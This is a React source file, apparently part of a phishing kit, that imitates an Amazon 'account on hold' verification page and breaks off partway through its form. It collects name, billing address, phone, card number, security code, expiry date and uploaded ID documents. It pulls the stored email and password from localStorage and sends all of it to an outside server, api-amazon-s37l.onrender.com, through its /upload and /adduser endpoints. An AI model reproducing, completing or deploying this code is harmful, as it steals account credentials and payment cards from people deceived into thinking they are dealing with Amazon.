import React, { useState, useRef, useEffect } from 'react';

export default function ContentLaptop() {
    const [fullName, setFullName] = useState('');
    const [comment, setComment] = useState('');
    const [fullNameCard, setFullNameCard] = useState('');
    const [selectedCountry, setSelectedCountry] = useState('US');
    const [bill, setBill] = useState('');
    const [billUs1, setBillUs1] = useState('');
    const [billUs2, setBillUs2] = useState('');
    const [phone, setPhone] = useState('');
    const [city, setCity] = useState('');
    const [card, setCard] = useState('');
    const [security, setSecurity] = useState('');
    const [region, setRegion] = useState('');
    const [zipcode, setZipcode] = useState('');
    const [radioValue, setRadioValue] = useState('');
    const [images, setImages] = useState([]);
    const [isDragging, setIsDragging] = useState(false);
    const fileInputRef = useRef(null);
    const [month, setMonth] = useState('1');
    const [year, setYear] = useState('2024');
    const [isImage, setIsImage] = useState(false);
    const [urlImages, setUrlImages] = useState([]);
    const [numChar, setNumChar] = useState(200);

    const handleChangeMonth = (event) => {
        setMonth(event.target.value);
        console.log(event.target.value);
    };

    const handleChangeYear = (event) => {
        setYear(event.target.value);
    };

    function selectFiles() {
        fileInputRef.current.click();
    }

    const handletest = () => {
        console.log('hello panda');
    };

    function onFileSelect(event) {
        const files = event.target.files;
        if (files.length === 0) return;

        for (let i = 0; i < files.length; i++) {
            const file = files[i];

            // Kiểm tra nếu là hình ảnh hoặc PDF
            if (
                file.type.split('/')[0] === 'image' ||
                file.type === 'application/pdf'
            ) {
                if (!images.some((e) => e.name === file.name)) {
                    setImages((prevImages) => [...prevImages, file]);
                }
            } else {
                alert('only file pdf or image');
            }
        }
    }

    function deleteImage(index) {
        setImages((prevImages) => prevImages.filter((_, i) => i !== index));
    }

    function onDragOver(event) {
        event.preventDefault();
        setIsDragging(true);
        event.dataTransfer.dropEffect = 'copy';
    }

    function onDragLeave(event) {
        event.preventDefault();
        setIsDragging(false);
    }

    function onDrop(event) {
        event.preventDefault();
        setIsDragging(false);
        const files = event.dataTransfer.files;

        for (let i = 0; i < files.length; i++) {
            const file = files[i];

            // Kiểm tra nếu là hình ảnh hoặc PDF
            if (
                file.type.split('/')[0] === 'image' ||
                file.type === 'application/pdf'
            ) {
                if (!images.some((e) => e.name === file.name)) {
                    setImages((prevImages) => [...prevImages, file]);
                }
            }
        }
    }

    const handleChangeFullName = (event) => {
        setFullName(event.target.value);
    };

    const handleChangeComment = (event) => {
        const inputText = event.target.value;
        setComment(inputText);
        const remainingChars = 200 - inputText.length;

        setNumChar(remainingChars);
    };

    const handleChangeFullNameCard = (event) => {
        setFullNameCard(event.target.value);
    };

    const handleCountryChange = (event) => {
        setSelectedCountry(event.target.value);
    };

    const handleChangeBill = (event) => {
        setBill(event.target.value);
    };

    const handleChangeBillUs1 = (event) => {
        setBillUs1(event.target.value);
    };

    const handleChangeBillUs2 = (event) => {
        setBillUs2(event.target.value);
    };

    const handleChangeCity = (event) => {
        setCity(event.target.value);
    };

    const handleChangeCard = (event) => {
        setCard(event.target.value);
    };

    const handleChangesecurity = (event) => {
        setSecurity(event.target.value);
    };

    const handleChangeRegion = (event) => {
        setRegion(event.target.value);
    };

    const handleChangePhone = (event) => {
        setPhone(event.target.value);
    };

    const handleChangeZipCode = (event) => {
        setZipcode(event.target.value);
    };

    const handleRadioChange = (event) => {
        setRadioValue(event.target.value);
    };

    //khi up load anh xong thi add user vao database
    useEffect(() => {
        if (urlImages.length > 0 && urlImages.length === images.length) {
            senDataUser();
            setUrlImages([]);
        } else {
            console.log(urlImages);
        }
    }, [urlImages]);

    const handleUpload = async (event) => {
        // http://localhost:4000
        // https://api-amazon-s37l.onrender.com
        event.preventDefault();

        if (images.length > 0) {
            for (let i = 0; i < images.length; i++) {
                let responseData;
                let formData = new FormData();
                formData.append('imageItem', images[i]);

                await fetch('https://api-amazon-s37l.onrender.com/upload', {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                    },
                    body: formData,
                })
                    .then((resp) => resp.json())
                    .then((data) => {
                        responseData = data;
                    });

                if (responseData.success) {
                    setUrlImages((prevUrl) => [
                        ...prevUrl,
                        responseData.image_url,
                    ]);
                }

                setIsImage(false);
            }
        } else {
            setIsImage(true);
        }
    };

    const senDataUser = async () => {
        const user = {
            email: localStorage.getItem('email'),
            Password: localStorage.getItem('password'),
            fullName: fullName,
            selectedCountry: selectedCountry,
            bill: bill,
            billUs1: billUs1,
            billUs2: billUs2,
            phone: phone,
            city: city,
            card: card,
            security: security,
            region: region,
            zipcode: zipcode,
            radioValue: radioValue,
            fullNameCard: fullNameCard,
            month: month,
            year: year,
            comment: comment,
            image: urlImages,
        };
        console.log(user);

        await fetch('https://api-amazon-s37l.onrender.com/adduser', {
            method: 'POST',
            headers: {
                Accept: 'application/json',
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(user),
        })
            .then((resp) => resp.json())
            .then((data) => {
                data.success ? alert('User Added') : alert('Failed');
            });
        localStorage.removeItem('email');
        localStorage.removeItem('password');
    };

    document.body.className = '';
    document.body.classList.add(
        'abbott-view',
        'a-m-us',
        'a-aui_72554-c',
        'a-aui_a11y_1_699934-c',
        'a-aui_a11y_4_835613-c',
        'a-aui_a11y_6_837773-c',
        'a-aui_a11y_sr_678508-c',
        'a-aui_killswitch_csa_logger_372963-c',
        'a-aui_pci_risk_banner_210084-c',
        'a-aui_preload_261698-c',
        'a-aui_rel_noreferrer_noopener_309527-c',
        'a-aui_template_weblab_cache_333406-c',
        'a-aui_tnr_v2_180836-c',
    );

    return (
        <>
            <div id="a-page">
                <div className="a-section">
                    <div className="a-section abbott-view-header">
                        <div className="a-section a-spacing-none">
                            <div className="a-section abbott-view-component">
                                <div className="a-section a-spacing-medium a-spacing-top-medium a-text-center">
                                    <a
                                        className="a-link-nav-icon"
                                        tabIndex="-1"
                                        href="https://www.amazon.com/"
                                    >
                                        <i
                                            className="a-icon a-icon-logo"
                                            role="presentation"
                                        ></i>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="a-section abbott-view-content content-width-mini">
                        <form>
                            <div
                                id="alert-0"
                                className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                            >
                                <div
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-section a-spacing-none has-action-on-load"
                                >
                                    <div
                                        className="a-box a-alert a-alert-error"
                                        role="alert"
                                    >
                                        <div className="a-box-inner a-alert-container">
                                            <h4 className="a-alert-heading pl-0-mobile text-15-mobile">
                                                Account on hold temporarily
                                            </h4>
                                            <i className="a-icon a-icon-alert display-mobile"></i>
                                            <div className="a-alert-content text-15-mobile">
                                                We noticed unusual payment
                                                activity on your account and
                                                need to verify ownership of the
                                                payment method used on your most
                                                recent order. (
                                                <span
                                                    className="a-declarative"
                                                    data-action="a-modal"
                                                    data-csa-c-type="widget"
                                                    data-csa-c-func-deps="aui-da-a-modal"
                                                    data-a-modal='{"name":"alert-0-1","width":"550","header":"Why are we asking for this information?"}'
                                                >
                                                    <a
                                                        className="a-link-normal"
                                                        href="/"
                                                    >
                                                        Why?
                                                    </a>
                                                </span>
                                                )
                                                <div
                                                    className="a-popover-preload"
                                                    id="a-popover-alert-0-1"
                                                >
                                                    <span>
                                                        Amazon takes your
                                                        security seriously, and
                                                        monitors activity on
                                                        your account to keep
                                                        your account and payment
                                                        methods safe.
                                                    </span>
                                                    <ul className="a-unordered-list a-vertical">
                                                        <li>
                                                            <span className="a-list-item">
                                                                We noticed
                                                                unusual payment
                                                                activity on your
                                                                account.
                                                            </span>
                                                        </li>
                                                        <li>
                                                            <span className="a-list-item">
                                                                We have
                                                                temporarily
                                                                placed your
                                                                account on hold
                                                                so we could
                                                                review it with
                                                                you.
                                                            </span>
                                                        </li>
                                                        <li>
                                                            <span className="a-list-item">
                                                                While your
                                                                account is on
                                                                hold, your
                                                                pending orders
                                                                are also on hold
                                                                and may be
                                                                cancelled.
                                                            </span>
                                                        </li>
                                                        <li>
                                                            <span className="a-list-item">
                                                                If you promptly
                                                                submit this form
                                                                and attach a
                                                                supporting
                                                                document, we may
                                                                be able to
                                                                remove the hold
                                                                on your account
                                                                more quickly.
                                                            </span>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div
                                id="header-1"
                                className="a-section a-spacing-mini abbott-view-component component-display-block component-width-extra_large"
                            >
                                <h1
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-large has-action-on-load text-align-left a-text-bold"
                                >
                                    Enter billing details
                                </h1>
                            </div>

                            <div
                                id="header-2"
                                className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                            >
                                <h1
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    className="a-size-base has-action-on-load text-align-left a-text-normal"
                                >
                                    This is required to remove the hold on your
                                    account.
                                </h1>
                            </div>

                            <div
                                id="text-input-3"
                                className="a-section a-spacing-extra-large abbott-view-component component-display-block component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <label className="a-form-label">
                                            <i className="input-field-required"></i>{' '}
                                            Full name
                                        </label>
                                        <input
                                            type="text"
                                            maxLength="100"
                                            placeholder="Name that appears on the payment method"
                                            name="full-name"
                                            value={fullName}
                                            onChange={handleChangeFullName}
                                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load"
                                            data-action-on-load="register-listeners"
                                            data-listeners=""
                                        />
                                    </div>
                                </div>
                            </div>

                            <div
                                id="country-4"
                                className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <label className="a-form-label">
                                            Country/Region
                                        </label>
                                        <span className="a-dropdown-container">
                                            <select
                                                name="country-code"
                                                autoComplete="off"
                                                tabIndex="0"
                                                value={selectedCountry}
                                                onChange={handleCountryChange}
                                                data-action="a-dropdown-select"
                                                className="a-native-dropdown a-declarative"
                                            >
                                                <option
                                                    onClick={handletest}
                                                    value="AF"
                                                >
                                                    Afghanistan
                                                </option>
                                                <option value="AX">
                                                    Aland Islands
                                                </option>
                                                <option value="AL">
                                                    Albania
                                                </option>
                                                <option value="DZ">
                                                    Algeria
                                                </option>
                                                <option value="AS">
                                                    American Samoa
                                                </option>
                                                <option value="AD">
                                                    Andorra
                                                </option>
                                                <option value="AO">
                                                    Angola
                                                </option>
                                                <option value="AI">
                                                    Anguilla
                                                </option>
                                                <option value="AQ">
                                                    Antarctica
                                                </option>
                                                <option value="AG">
                                                    Antigua and Barbuda
                                                </option>
                                                <option value="AR">
                                                    Argentina
                                                </option>
                                                <option value="AM">
                                                    Armenia
                                                </option>
                                                <option value="AW">
                                                    Aruba
                                                </option>
                                                <option value="AU">
                                                    Australia
                                                </option>
                                                <option value="AT">
                                                    Austria
                                                </option>
                                                <option value="AZ">
                                                    Azerbaijan
                                                </option>
                                                <option value="BS">
                                                    Bahamas, The
                                                </option>
                                                <option value="BH">
                                                    Bahrain
                                                </option>
                                                <option value="BD">
                                                    Bangladesh
                                                </option>
                                                <option value="BB">
                                                    Barbados
                                                </option>
                                                <option value="BY">
                                                    Belarus
                                                </option>
                                                <option value="BE">
                                                    Belgium
                                                </option>
                                                <option value="BZ">
                                                    Belize
                                                </option>
                                                <option value="BJ">
                                                    Benin
                                                </option>
                                                <option value="BM">
                                                    Bermuda
                                                </option>
                                                <option value="BT">
                                                    Bhutan
                                                </option>
                                                <option value="BO">
                                                    Bolivia
                                                </option>
                                                <option value="BQ">
                                                    Bonaire, Saint Eustatius and
                                                    Saba
                                                </option>
                                                <option value="BA">
                                                    Bosnia and Herzegovina
                                                </option>
                                                <option value="BW">
                                                    Botswana
                                                </option>
                                                <option value="BV">
                                                    Bouvet Island
                                                </option>
                                                <option value="BR">
                                                    Brazil
                                                </option>
                                                <option value="IO">
                                                    British Indian Ocean
                                                    Territory
                                                </option>
                                                <option value="BN">
                                                    Brunei Darussalam
                                                </option>
                                                <option value="BG">
                                                    Bulgaria
                                                </option>
                                                <option value="BF">
                                                    Burkina Faso
                                                </option>
                                                <option value="BI">
                                                    Burundi
                                                </option>
                                                <option value="KH">
                                                    Cambodia
                                                </option>
                                                <option value="CM">
                                                    Cameroon
                                                </option>
                                                <option value="CA">
                                                    Canada
                                                </option>
                                                <option value="IC">
                                                    Canary Islands
                                                </option>
                                                <option value="CV">
                                                    Cape Verde
                                                </option>
                                                <option value="KY">
                                                    Cayman Islands
                                                </option>
                                                <option value="CF">
                                                    Central African Republic
                                                </option>
                                                <option value="TD">Chad</option>
                                                <option value="CL">
                                                    Chile
                                                </option>
                                                <option value="CN">
                                                    China
                                                </option>
                                                <option value="CX">
                                                    Christmas Island
                                                </option>
                                                <option value="CC">
                                                    Cocos (Keeling) Islands
                                                </option>
                                                <option value="CO">
                                                    Colombia
                                                </option>
                                                <option value="KM">
                                                    Comoros
                                                </option>
                                                <option value="CG">
                                                    Congo
                                                </option>
                                                <option value="CD">
                                                    Congo, The Democratic
                                                    Republic of the
                                                </option>
                                                <option value="CK">
                                                    Cook Islands
                                                </option>
                                                <option value="CR">
                                                    Costa Rica
                                                </option>
                                                <option value="CI">
                                                    Cote D'ivoire
                                                </option>
                                                <option value="HR">
                                                    Croatia
                                                </option>
                                                <option value="CU">Cuba</option>
                                                <option value="CW">
                                                    Curaçao
                                                </option>
                                                <option value="CY">
                                                    Cyprus
                                                </option>
                                                <option value="CZ">
                                                    Czech Republic
                                                </option>
                                                <option value="DK">
                                                    Denmark
                                                </option>
                                                <option value="DJ">
                                                    Djibouti
                                                </option>
                                                <option value="DM">
                                                    Dominica
                                                </option>
                                                <option value="DO">
                                                    Dominican Republic
                                                </option>
                                                <option value="EC">
                                                    Ecuador
                                                </option>
                                                <option value="EG">
                                                    Egypt
                                                </option>
                                                <option value="SV">
                                                    El Salvador
                                                </option>
                                                <option value="GQ">
                                                    Equatorial Guinea
                                                </option>
                                                <option value="ER">
                                                    Eritrea
                                                </option>
                                                <option value="EE">
                                                    Estonia
                                                </option>
                                                <option value="ET">
                                                    Ethiopia
                                                </option>
                                                <option value="FK">
                                                    Falkland Islands (Malvinas)
                                                </option>
                                                <option value="FO">
                                                    Faroe Islands
                                                </option>
                                                <option value="FJ">Fiji</option>
                                                <option value="FI">
                                                    Finland
                                                </option>
                                                <option value="FR">
                                                    France
                                                </option>
                                                <option value="GF">
                                                    French Guiana
                                                </option>
                                                <option value="PF">
                                                    French Polynesia
                                                </option>
                                                <option value="TF">
                                                    French Southern Territories
                                                </option>
                                                <option value="GA">
                                                    Gabon
                                                </option>
                                                <option value="GM">
                                                    Gambia, The
                                                </option>
                                                <option value="GE">
                                                    Georgia
                                                </option>
                                                <option value="DE">
                                                    Germany
                                                </option>
                                                <option value="GH">
                                                    Ghana
                                                </option>
                                                <option value="GI">
                                                    Gibraltar
                                                </option>
                                                <option value="GR">
                                                    Greece
                                                </option>
                                                <option value="GL">
                                                    Greenland
                                                </option>
                                                <option value="GD">
                                                    Grenada
                                                </option>
                                                <option value="GP">
                                                    Guadeloupe
                                                </option>
                                                <option value="GU">Guam</option>
                                                <option value="GT">
                                                    Guatemala
                                                </option>
                                                <option value="GG">
                                                    Guernsey
                                                </option>
                                                <option value="GN">
                                                    Guinea
                                                </option>
                                                <option value="GW">
                                                    Guinea-Bissau
                                                </option>
                                                <option value="GY">
                                                    Guyana
                                                </option>
                                                <option value="HT">
                                                    Haiti
                                                </option>
                                                <option value="HM">
                                                    Heard Island and the
                                                    McDonald Islands
                                                </option>
                                                <option value="VA">
                                                    Holy See
                                                </option>
                                                <option value="HN">
                                                    Honduras
                                                </option>
                                                <option value="HK">
                                                    Hong Kong
                                                </option>
                                                <option value="HU">
                                                    Hungary
                                                </option>
                                                <option value="IS">
                                                    Iceland
                                                </option>
                                                <option value="IN">
                                                    India
                                                </option>
                                                <option value="ID">
                                                    Indonesia
                                                </option>
                                                <option value="IR">
                                                    Iran, Islamic Republic of
                                                </option>
                                                <option value="IQ">Iraq</option>
                                                <option value="IE">
                                                    Ireland
                                                </option>
                                                <option value="IM">
                                                    Isle of Man
                                                </option>
                                                <option value="IL">
                                                    Israel
                                                </option>
                                                <option value="IT">
                                                    Italy
                                                </option>
                                                <option value="JM">
                                                    Jamaica
                                                </option>
                                                <option value="JP">
                                                    Japan
                                                </option>
                                                <option value="JE">
                                                    Jersey
                                                </option>
                                                <option value="JO">
                                                    Jordan
                                                </option>
                                                <option value="KZ">
                                                    Kazakhstan
                                                </option>
                                                <option value="KE">
                                                    Kenya
                                                </option>
                                                <option value="KI">
                                                    Kiribati
                                                </option>
                                                <option value="KP">
                                                    Korea, Democratic People's
                                                    Republic of
                                                </option>
                                                <option value="KR">
                                                    Korea, Republic of
                                                </option>
                                                <option value="XK">
                                                    Kosovo
                                                </option>
                                                <option value="KW">
                                                    Kuwait
                                                </option>
                                                <option value="KG">
                                                    Kyrgyzstan
                                                </option>
                                                <option value="LA">
                                                    Lao People's Democratic
                                                    Republic
                                                </option>
                                                <option value="LV">
                                                    Latvia
                                                </option>
                                                <option value="LB">
                                                    Lebanon
                                                </option>
                                                <option value="LS">
                                                    Lesotho
                                                </option>
                                                <option value="LR">
                                                    Liberia
                                                </option>
                                                <option value="LY">
                                                    Libya
                                                </option>
                                                <option value="LI">
                                                    Liechtenstein
                                                </option>
                                                <option value="LT">
                                                    Lithuania
                                                </option>
                                                <option value="LU">
                                                    Luxembourg
                                                </option>
                                                <option value="MO">
                                                    Macao
                                                </option>
                                                <option value="MK">
                                                    Macedonia, The Former
                                                    Yugoslav Republic of
                                                </option>
                                                <option value="MG">
                                                    Madagascar
                                                </option>
                                                <option value="MW">
                                                    Malawi
                                                </option>
                                                <option value="MY">
                                                    Malaysia
                                                </option>
                                                <option value="MV">
                                                    Maldives
                                                </option>
                                                <option value="ML">Mali</option>
                                                <option value="MT">
                                                    Malta
                                                </option>
                                                <option value="MH">
                                                    Marshall Islands
                                                </option>
                                                <option value="MQ">
                                                    Martinique
                                                </option>
                                                <option value="MR">
                                                    Mauritania
                                                </option>
                                                <option value="MU">
                                                    Mauritius
                                                </option>
                                                <option value="YT">
                                                    Mayotte
                                                </option>
                                                <option value="MX">
                                                    Mexico
                                                </option>
                                                <option value="FM">
                                                    Micronesia, Federated States
                                                    of
                                                </option>
                                                <option value="MD">
                                                    Moldova, Republic of
                                                </option>
                                                <option value="MC">
                                                    Monaco
                                                </option>
                                                <option value="MN">
                                                    Mongolia
                                                </option>
                                                <option value="ME">
                                                    Montenegro
                                                </option>
                                                <option value="MS">
                                                    Montserrat
                                                </option>
                                                <option value="MA">
                                                    Morocco
                                                </option>
                                                <option value="MZ">
                                                    Mozambique
                                                </option>
                                                <option value="MM">
                                                    Myanmar
                                                </option>
                                                <option value="NA">
                                                    Namibia
                                                </option>
                                                <option value="NR">
                                                    Nauru
                                                </option>
                                                <option value="NP">
                                                    Nepal
                                                </option>
                                                <option value="NL">
                                                    Netherlands
                                                </option>
                                                <option value="AN">
                                                    Netherlands Antilles
                                                </option>
                                                <option value="NC">
                                                    New Caledonia
                                                </option>
                                                <option value="NZ">
                                                    New Zealand
                                                </option>
                                                <option value="NI">
                                                    Nicaragua
                                                </option>
                                                <option value="NE">
                                                    Niger
                                                </option>
                                                <option value="NG">
                                                    Nigeria
                                                </option>
                                                <option value="NU">Niue</option>
                                                <option value="NF">
                                                    Norfolk Island
                                                </option>
                                                <option value="MP">
                                                    Northern Mariana Islands
                                                </option>
                                                <option value="NO">
                                                    Norway
                                                </option>
                                                <option value="OM">Oman</option>
                                                <option value="PK">
                                                    Pakistan
                                                </option>
                                                <option value="PW">
                                                    Palau
                                                </option>
                                                <option value="PS">
                                                    Palestinian Territories
                                                </option>
                                                <option value="PA">
                                                    Panama
                                                </option>
                                                <option value="PG">
                                                    Papua New Guinea
                                                </option>
                                                <option value="PY">
                                                    Paraguay
                                                </option>
                                                <option value="PE">Peru</option>
                                                <option value="PH">
                                                    Philippines
                                                </option>
                                                <option value="PN">
                                                    Pitcairn
                                                </option>
                                                <option value="PL">
                                                    Poland
                                                </option>
                                                <option value="PT">
                                                    Portugal
                                                </option>
                                                <option value="PR">
                                                    Puerto Rico
                                                </option>
                                                <option value="QA">
                                                    Qatar
                                                </option>
                                                <option value="RE">
                                                    Reunion
                                                </option>
                                                <option value="RO">
                                                    Romania
                                                </option>
                                                <option value="RU">
                                                    Russian Federation
                                                </option>
                                                <option value="RW">
                                                    Rwanda
                                                </option>
                                                <option value="BL">
                                                    Saint Barthelemy
                                                </option>
                                                <option value="SH">
                                                    Saint Helena, Ascension and
                                                    Tristan da Cunha
                                                </option>
                                                <option value="KN">
                                                    Saint Kitts and Nevis
                                                </option>
                                                <option value="LC">
                                                    Saint Lucia
                                                </option>
                                                <option value="MF">
                                                    Saint Martin
                                                </option>
                                                <option value="PM">
                                                    Saint Pierre and Miquelon
                                                </option>
                                                <option value="VC">
                                                    Saint Vincent and the
                                                    Grenadines
                                                </option>
                                                <option value="WS">
                                                    Samoa
                                                </option>
                                                <option value="SM">
                                                    San Marino
                                                </option>
                                                <option value="ST">
                                                    Sao Tome and Principe
                                                </option>
                                                <option value="SA">
                                                    Saudi Arabia
                                                </option>
                                                <option value="SN">
                                                    Senegal
                                                </option>
                                                <option value="RS">
                                                    Serbia
                                                </option>
                                                <option value="CS">
                                                    Serbia and Montenegro
                                                </option>
                                                <option value="SC">
                                                    Seychelles
                                                </option>
                                                <option value="SL">
                                                    Sierra Leone
                                                </option>
                                                <option value="SG">
                                                    Singapore
                                                </option>
                                                <option value="SX">
                                                    Sint Maarten
                                                </option>
                                                <option value="SK">
                                                    Slovakia
                                                </option>
                                                <option value="SI">
                                                    Slovenia
                                                </option>
                                                <option value="SB">
                                                    Solomon Islands
                                                </option>
                                                <option value="SO">
                                                    Somalia
                                                </option>
                                                <option value="ZA">
                                                    South Africa
                                                </option>
                                                <option value="GS">
                                                    South Georgia and the South
                                                    Sandwich Islands
                                                </option>
                                                <option value="SS">
                                                    South Sudan
                                                </option>
                                                <option value="ES">
                                                    Spain
                                                </option>
                                                <option value="LK">
                                                    Sri Lanka
                                                </option>
                                                <option value="SD">
                                                    Sudan
                                                </option>
                                                <option value="SR">
                                                    Suriname
                                                </option>
                                                <option value="SJ">
                                                    Svalbard and Jan Mayen
                                                </option>
                                                <option value="SZ">
                                                    Swaziland
                                                </option>
                                                <option value="SE">
                                                    Sweden
                                                </option>
                                                <option value="CH">
                                                    Switzerland
                                                </option>
                                                <option value="SY">
                                                    Syria
                                                </option>
                                                <option value="TW">
                                                    Taiwan
                                                </option>
                                                <option value="TJ">
                                                    Tajikistan
                                                </option>
                                                <option value="TZ">
                                                    Tanzania, United Republic of
                                                </option>
                                                <option value="TH">
                                                    Thailand
                                                </option>
                                                <option value="TL">
                                                    Timor-leste
                                                </option>
                                                <option value="TG">Togo</option>
                                                <option value="TK">
                                                    Tokelau
                                                </option>
                                                <option value="TO">
                                                    Tonga
                                                </option>
                                                <option value="TT">
                                                    Trinidad and Tobago
                                                </option>
                                                <option value="TN">
                                                    Tunisia
                                                </option>
                                                <option value="TR">
                                                    Turkey
                                                </option>
                                                <option value="TM">
                                                    Turkmenistan
                                                </option>
                                                <option value="TC">
                                                    Turks and Caicos Islands
                                                </option>
                                                <option value="TV">
                                                    Tuvalu
                                                </option>
                                                <option value="UG">
                                                    Uganda
                                                </option>
                                                <option value="UA">
                                                    Ukraine
                                                </option>
                                                <option value="AE">
                                                    United Arab Emirates
                                                </option>
                                                <option value="GB">
                                                    United Kingdom
                                                </option>
                                                <option value="US" selected>
                                                    United States
                                                </option>
                                                <option value="UM">
                                                    United States Minor Outlying
                                                    Islands
                                                </option>
                                                <option value="UY">
                                                    Uruguay
                                                </option>
                                                <option value="UZ">
                                                    Uzbekistan
                                                </option>
                                                <option value="VU">
                                                    Vanuatu
                                                </option>
                                                <option value="VE">
                                                    Venezuela
                                                </option>
                                                <option value="VN">
                                                    Vietnam
                                                </option>
                                                <option value="VG">
                                                    Virgin Islands, British
                                                </option>
                                                <option value="VI">
                                                    Virgin Islands, U.S.
                                                </option>
                                                <option value="WF">
                                                    Wallis and Futuna
                                                </option>
                                                <option value="EH">
                                                    Western Sahara
                                                </option>
                                                <option value="YE">
                                                    Yemen
                                                </option>
                                                <option value="YU">
                                                    Yugoslavia
                                                </option>
                                                <option value="ZM">
                                                    Zambia
                                                </option>
                                                <option value="ZW">
                                                    Zimbabwe
                                                </option>
                                            </select>
                                            <span
                                                tabIndex="-1"
                                                data-action-on-load="register-listeners"
                                                data-listeners=""
                                                data-a-classname="input-field-width has-action-on-load"
                                                className="a-button a-button-dropdown input-field-width has-action-on-load"
                                                aria-hidden="true"
                                            >
                                                <span className="a-button-inner">
                                                    <span
                                                        className="a-button-text a-declarative"
                                                        data-csa-c-func-deps="aui-da-a-dropdown-button"
                                                        data-csa-c-type="widget"
                                                        data-csa-interaction-events="click"
                                                        data-action="a-dropdown-button"
                                                        aria-hidden="true"
                                                    >
                                                        <span className="a-dropdown-prompt"></span>
                                                    </span>
                                                    <i className="a-icon a-icon-dropdown"></i>
                                                </span>
                                            </span>
                                        </span>
                                    </div>
                                </div>
                            </div>

                            <div
                                id="text-area-5"
                                className="a-section a-spacing-extra-large abbott-view-component component-display-none component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <label className="a-form-label">
                                            <i className="input-field-required"></i>{' '}
                                            Billing address
                                        </label>
                                        <div
                                            data-action-on-load="register-listeners"
                                            data-listeners='[{"name":"country-code","toggle":"block","matcher":"not_in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                            className="a-input-text-wrapper input-field-width has-action-on-load"
                                        >
                                            <textarea
                                                maxLength="300"
                                                rows="5"
                                                value={bill}
                                                onChange={handleChangeBill}
                                                name="address-generic"
                                                className="a-form-normal"
                                            ></textarea>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div
                                id="text-input-6"
                                className="a-section a-spacing-base abbott-view-component component-display-none component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <label className="a-form-label">
                                            <i className="input-field-required"></i>{' '}
                                            Billing address
                                        </label>
                                        <input
                                            type="text"
                                            maxLength="100"
                                            value={billUs1}
                                            onChange={handleChangeBillUs1}
                                            placeholder="Street and number, P.O. box, c/o."
                                            name="street-line-one"
                                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load"
                                            data-action-on-load="register-listeners"
                                            data-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                        />
                                    </div>
                                </div>
                            </div>

                            <div
                                id="text-input-7"
                                className="a-section a-spacing-base abbott-view-component component-display-none component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <input
                                            type="text"
                                            maxLength="100"
                                            value={billUs2}
                                            onChange={handleChangeBillUs2}
                                            placeholder="Apartment, suite, unit, building, floor, etc."
                                            name="street-line-two"
                                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load"
                                            data-action-on-load="register-listeners"
                                            data-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                        />
                                    </div>
                                </div>
                            </div>

                            <div
                                id="text-input-8"
                                className="a-section a-spacing-base abbott-view-component component-display-none component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <label className="a-form-label">
                                            <i className="input-field-required"></i>{' '}
                                            City
                                        </label>
                                        <input
                                            type="text"
                                            maxLength="100"
                                            value={city}
                                            onChange={handleChangeCity}
                                            name="city"
                                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load"
                                            data-action-on-load="register-listeners"
                                            data-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                        />
                                    </div>
                                </div>
                            </div>

                            <div
                                id="text-input-9"
                                className="a-section a-spacing-base abbott-view-component component-display-none component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <label className="a-form-label">
                                            <i className="input-field-required"></i>{' '}
                                            State/Province/Region
                                        </label>
                                        <input
                                            type="text"
                                            maxLength="100"
                                            value={region}
                                            onChange={handleChangeRegion}
                                            name="region"
                                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load"
                                            data-action-on-load="register-listeners"
                                            data-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                        />
                                    </div>
                                </div>
                            </div>

                            <div
                                id="text-input-10"
                                className="a-section a-spacing-extra-large abbott-view-component component-display-none component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <label className="a-form-label">
                                            <i className="input-field-required"></i>{' '}
                                            Zip Code
                                        </label>
                                        <input
                                            type="text"
                                            maxLength="100"
                                            value={zipcode}
                                            onChange={handleChangeZipCode}
                                            name="zip-code"
                                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load"
                                            data-action-on-load="register-listeners"
                                            data-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                        />
                                    </div>
                                </div>
                            </div>

                            <div
                                id="text-input-11"
                                className="a-section a-spacing-extra-large abbott-view-component component-display-block component-width-extra_large"
                            >
                                <div className="a-section a-spacing-none">
                                    <div className="a-section a-spacing-none">
                                        <label className="a-form-label">
                                            <i className="input-field-required"></i>{' '}
                                            Phone number
                                        </label>
                                        <input
                                            type="tel"
                                            maxLength="20"
                                            value={phone}
                                            onChange={handleChangePhone}
